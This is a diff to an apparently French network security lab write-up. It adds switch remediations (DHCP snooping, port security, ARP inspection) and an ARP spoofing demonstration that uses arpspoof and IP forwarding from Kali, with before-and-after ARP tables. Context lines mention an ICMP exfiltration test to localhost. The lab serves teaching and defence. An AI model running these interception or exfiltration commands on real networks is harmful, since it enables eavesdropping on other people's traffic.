@@ -123,6 +123,29 @@ LPORT       : 20044
 RHOST:PORT  : 127.0.0.1:20045
 MTU         : 1500
 
+Remédiation : 
+Switch# conf t
+Switch(config)# ip dhcp snooping
+Switch(config)# ip dhcp snooping vlan ..
+Switch(config)# interface ...
+Switch(config-if)# ip dhcp snooping trust
+Switch(config-if)# exit
+Switch(config)# interface ...
+Switch(config-if)# ip dhcp snooping untrust
+Switch(config-if)# exit
+Switch(config)# exit
+Switch# show ip dhcp snooping
+
+Switch# conf t
+Switch(config)# interface ...
+Switch(config-if)# switchport port-security
+Switch(config-if)# switchport port-security maximum 2
+Switch(config-if)# switchport port-security violation restrict
+Switch(config-if)# switchport port-security mac-address sticky
+Switch(config-if)# exit
+Switch(config)# exit
+Switch# show port-security
+
 
 ICMP
 
@@ -146,4 +169,34 @@ Envoi du bloc 1 vers 127.0.0.1 : b'toto\n'
 Exfiltration terminée
 #### Interception ping
 
-Capture :
+Remédiation :
+
+
+ARP 
+┌──(root㉿kali)-[~]
+└─$ echo 1 > /proc/sys/net/ipv4/ip_forward
+
+┌──(root㉿kali)-[~]
+└─$ arpspoof -i eth0 -t 10.2.1.100 -r 10.2.1.254
+ARP reply sent to 10.2.1.100 (00:11:22:33:44:55) telling it's 10.2.1.254
+ARP reply sent to 10.2.1.254 (00:11:22:33:44:55) telling it's 10.2.1.100
+...
+
+PC1> sh arp
+
+10.2.1.254  00:50:79:66:68:05
+10.2.1.100  00:11:22:33:44:55
+
+PC1> sh arp
+
+10.2.1.254  00:11:22:33:44:55
+10.2.1.100  00:11:22:33:44:55
+
+Remédiation : 
+
+Switch(config)# ip arp inspection vlan 1
+Switch(config)# ip dhcp snooping
+Switch(config)# ip dhcp snooping vlan 1
+Switch(config)# exit
+Switch# show ip arp inspection
+
